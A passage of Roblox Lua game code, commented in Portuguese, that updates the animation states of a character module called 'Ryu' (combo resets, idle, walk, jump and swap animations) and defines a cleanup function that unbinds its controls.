    if unsatActive and currentAction == "unsatisfied" then
        local hrp = figure:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = hrp.CFrame + hrp.CFrame.LookVector * (20 * dt) end
    end

    -- animação de swap: avança com elapsed clampado ao duration, depois libera
    if swapActive and animSwap then
        local elapsed = os.clock() - swapStart
        if elapsed >= swapDur then
            -- swap terminou: zera peso e volta pro idle
            animSwap.weight = 0
            swapActive      = false
            currentBase     = "none"  -- força setBase no próximo tick
        else
            -- avança a animação com o tempo elapsed (não ultrapassa o fim)
            animSwap:Step(elapsed)
        end
    end

    -- M1 combo reset
    if lmbResetTimer > 0 and not currentAction then
        lmbResetTimer = lmbResetTimer - dt
        if lmbResetTimer <= 0 then lmbResetTimer=0; lmbStep=1 end
    end

    -- auto-stop da ação atual → libera imediatamente para idle
    if currentAction then
        local isM1 = currentAction:sub(1,2) == "m1"
        local a = isM1 and lmbAnims[tonumber(currentAction:sub(3))] or actionAnims[currentAction]
        if a and actionStart[a] then
            local elapsed  = os.clock() - actionStart[a]
            local duration = (a.track and a.track.Time or 0) / (a.speed or 1)
            if duration > 0 and elapsed >= duration then
                a.weight      = 0
                unsatActive   = false
                stopActSound()
                currentAction = nil
                if isM1 then lmbResetTimer = LMB_RESET_TIME end
                currentBase = "none"
            end
        end
    end

    -- base state (idle/walk/jump) — só quando não há ação nem swap rodando
    if not currentAction and not swapActive then
        if inAir then
            if not wasInAir then
                clearBase()
                currentBase = "jump"
                animJump.weight = 1
                actionStart[animJump] = os.clock()
            end
        else
            if wasInAir then animJump.weight = 0 end
            setBase(hum.MoveDirection.Magnitude > 0.1 and "walk" or "idle")
        end
    end

    wasInAir = inAir

    -- step anims base (idle/walk/jump)
    local now = os.clock()
    for _, a in pairs(baseAnims) do
        if a.weight > 0 then a:Step(now) end
    end

    -- step swap com elapsed já calculado (não re-calcular aqui para não fazer double-step)
    -- (já foi feito no bloco swapActive acima)

    -- step anims de ação
    for a, t0 in pairs(actionStart) do
        if a.weight > 0 then
            a:Step(os.clock() - t0)
        end
    end
end

-- ── DESTROY ───────────────────────────────────────────────────
m.Destroy = function()
    CAS:UnbindAction("Ryu_M1"); CAS:UnbindAction("Ryu_Swap")
    CAS:UnbindAction("Ryu_Special")
    CAS:UnbindAction("Ryu_E"); CAS:UnbindAction("Ryu_Q")
    CAS:UnbindAction("Ryu_R"); CAS:UnbindAction("Ryu_Z")

    if bgSound then bgSound:Stop(); bgSound:Destroy(); bgSound=nil end
    stopActSound(); cleanHair(); cleanBlast(); cleanTempFX()

    baseAnims={}; normAnims={}; ultAnims={}; lmbAnims={}
    actionAnims={}; actionSounds={}; normSounds={}; ultSounds={}; actionStart={}

    currentAction=nil; currentBase="idle"; modeB=false
    lmbStep=1; lmbResetTimer=0; figureRef=nil
    wasInAir=false; swapActive=false; unsatActive=false
    animJump=nil; animSwap=nil
    blastFired=false; blastTimer=0; blastActive=false
    blastSphere=nil; blastRing1=nil; blastRing2=nil
end

return m
end)

return modules

